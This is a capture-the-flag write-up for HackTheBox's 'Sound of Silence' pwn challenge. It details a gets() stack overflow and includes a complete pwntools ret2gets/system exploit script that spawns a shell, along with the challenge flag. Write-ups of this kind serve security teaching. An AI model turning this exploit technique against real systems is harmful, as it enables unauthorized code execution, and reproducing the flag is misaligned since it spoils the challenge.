# Sound of Silence

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c00cb1d6-aa6b-4bff-b60d-65115285d01f)


> Write-up author: jon-brandy

## Lessons Learned:
1. Stack-Based Exploitation.
2. Manipulate return address to gets(), then use system() as it's argument.

## DESCRIPTION:

<p align="justify">Navigate the shadows in a dimly lit room, silently evading detection as you strategize to outsmart your foes. Employ clever distractions to divert their attention, paving the way for your daring escape!</p>

## STEPS:
1. In this challenge, we're given a 64 bit binary, dynamically linked, and not stripped.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5e40093d-ac65-4955-9bb6-93899c3d2a2f)


> BINARY PROTECTIONS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e53e26ae-0d6c-457f-a5d7-e643dec8c82e)


2. Upon reviewing the decompiled code on Ghidra, it's very clear that the vuln reside at the **gets()** usage.
3. There are no bound checking, even the canary and PIE is dead. Also there is a **system()** call.
4. Hence, it's easier for us to obtain RCE.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/921676d0-52ff-4216-ac33-93d6275740da)


5. BUT the problem here, remembering it does call system(), hence we can't identify RIP offset like usual with it.
6. Although we can do it manually, but still I preferred using GDB.
7. The method is to do **set follow-fork-mode parent** at GDB.
8. So now the GDB is following the parent process, not the child process.
9. Simply send +16 bytes or even more than the available buffers to hold by the input variable.
10. We shall gained segfault.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4860fb58-d5a6-4801-b9fc-b20a8200d512)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/cbbd5a52-3c99-44fb-9230-93511d71b80c)


11. Nice! Now, what are our objectives? There is no **write()**, **read()**, **printf()**, or **puts()** call.
12. BUT there is **system()**.
13. Our objective is to return to `gets@plt`, then pass `system()` as it's arg.
14. Finally, simply passing the `/bin/sh\x00` strings.
15. Here's the crafted script.

> SCRIPT

```py
from pwn import *

exe = './sound_of_silence'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = process(exe)

p = flat([
    cyclic(40),
    elf.sym['gets'],
    elf.sym['system']
])

sh.sendline(p)
sh.sendline(b'/bin/sh\x00')

sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b3918398-f44c-43fb-8cc3-cb832f15354e)


16. Interesting, we failed to get shell. Based from the received bytes, it said `/bin.sh` not found.
17. Noticed our `/` is bit-flipped (?)
18. Upon debugging our input by set breakpoints at **main()**, we found an interesting pointer stored at the RDI upon step into the **gets()** call.

> AFTER THE GETS CALL, PASS FEW BYTES

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b588ca19-e6ba-4ccf-a788-b20f16c38bbc)


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/02adb208-ddfe-4e7b-8143-a237f6a58700)


19. Interesting! RDI is filled with 0x0 value. This indicates a **standard lockp**.
20. This could be the reason why our shell strings is bitflipped.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/094570a3-cbc8-4725-b164-80b9239a9ea2)


21. Running **vmmap** to check the address. We can see it's writeable! That is also the reason why we can write `/bin/sh`.
22. So our objective is left to identify which character when it's bitflipped, resulting to "/".
23. Long story short, upon stuffing all the chars. Found that passing `/bin0sh` resulting to `/bin/sh`.

> FULL SCRIPT

```py
from pwn import *

exe = './sound_of_silence'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = process(exe)

p = flat([
    cyclic(40),
    elf.sym['gets'],
    elf.sym['system']
])

sh.sendline(p)
sh.sendline(b'/bin0sh\x00')

sh.interactive()
```

> REMOTE TEST

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/428edca9-fa1f-4699-aef8-b1f40a05ab91)


24. Nice! We've pwned it!

## FLAG

```
HTB{5y5t3m_15_m0r3_th4n_en0ugh!~!}
```
